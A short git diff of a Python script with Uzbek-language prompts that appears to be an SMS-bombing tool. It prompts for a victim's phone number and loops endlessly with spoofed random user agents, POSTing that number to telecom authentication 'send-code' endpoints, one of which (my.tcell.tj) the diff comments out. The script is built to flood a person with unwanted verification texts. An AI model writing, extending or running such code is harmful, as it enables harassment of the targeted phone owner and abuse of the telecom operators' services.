@@ -30,12 +30,12 @@ if user_input == '1':
 
 elif user_input == '2':
     print(' * Modullar Yuklanmoqda...')
-    time.sleep(5)
+    time.sleep(3)
     print()
     
     user = fake_useragent.UserAgent().random
     headers = {'user_agent' : user}
-    NUMBER = input(colored('Telfon Raqamingizni Kiriting: (Misol Uchun +998) ' , 'red') )
+    NUMBER = input(colored('Telfon Raqamingizni Kiriting: (Misol Uchun 998) ' , 'red') )
 
 while True:
     user = fake_useragent.UserAgent().random
@@ -53,8 +53,8 @@ while True:
     except:
         time.sleep(1)
 
-    try:
-        response = requests.post('http://my.tcell.tj/api/v3/auth/send-code/', headers=headers, data={'phone' : NUMBER})
-        print(colored('* Xabar Yuborilmoqda', 'blue'))
-    except:
-        time.sleep(1)
+    # try:
+    #     response = requests.post('http://my.tcell.tj/api/v3/auth/send-code/', headers=headers, data={'phone' : NUMBER})
+    #     print(colored('* Xabar Yuborilmoqda', 'blue'))
+    # except:
+    #     time.sleep(1)
